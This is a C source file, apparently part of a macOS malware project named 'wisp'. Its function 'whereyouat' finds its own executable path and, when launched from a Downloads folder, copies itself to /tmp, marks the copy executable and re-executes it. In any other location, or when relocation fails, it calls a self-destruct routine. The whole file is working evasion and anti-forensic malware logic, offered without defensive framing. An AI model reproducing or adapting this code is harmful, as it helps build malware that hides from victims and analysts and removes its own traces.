#include "wisp.h"

//===================================================================
/// WHEREYOUAT?  
//===================================================================

__attribute__((always_inline)) static inline bool is_tmp_path(const char *path) {
    return (strstr(path, "/tmp/") != NULL);
}

__attribute__((always_inline)) static inline bool is_downloads_path(const char *path) {
    return (strstr(path, "/Downloads/") != NULL);
}

__attribute__((always_inline)) static inline void get_basename(const char *path, char *base, size_t base_size) {
    const char *ptr = strrchr(path, '/');
    if (ptr && *(ptr + 1))
        _strncpy(base, ptr + 1, base_size);
    else
        _strncpy(base, path, base_size);
}

__attribute__((always_inline)) static inline void construct_tmp_path(const char *base, char *tmp_path, size_t tmp_size) {
    _bzero(tmp_path, tmp_size);
    _snprintf(tmp_path, tmp_size, "/tmp/%s", base);
}

void whereyouat(void) {
    char exe_path[1024] = {0};
    uint32_t path_size = sizeof(exe_path);
    
    // Retrieve the executable's full path.
    _NSGetExecutablePath(exe_path, &path_size);
    
    // If already running from /tmp/, we're good.
    if (is_tmp_path(exe_path))
        return;
    
    // If running from /Downloads/, relocate the binary.
    if (is_downloads_path(exe_path)) {
        char base[256] = {0};
        char tmp_path[1024] = {0};
        
        get_basename(exe_path, base, sizeof(base));
        construct_tmp_path(base, tmp_path, sizeof(tmp_path));
        
        FILE *source = fopen(exe_path, "rb");
        if (!source)
            goto _error;
        
        FILE *dest = fopen(tmp_path, "wb");
        if (!dest) {
            fclose(source);
            goto _error;
        }
        
        char buf[4096] = {0};
        size_t read_bytes;
        while ((read_bytes = fread(buf, 1, sizeof(buf), source)) > 0) {
            if (fwrite(buf, 1, read_bytes, dest) != read_bytes) {
                fclose(source);
                fclose(dest);
                goto _error;
            }
        }
        
        fclose(source);
        fclose(dest);
        
        // Set execution permissions on the new binary.
        chmod(tmp_path, 0755);
        
        // Re-execute from the new location.
        {
            char *args[] = { tmp_path, NULL };
            execv(tmp_path, args);
        }
        
        // If execv fails, continue to error cleanup.
        goto _error;
    }

_error:
    // If we cannot relocate or aren't in an expected environment, self-destruct.
    destruct_mode();
}
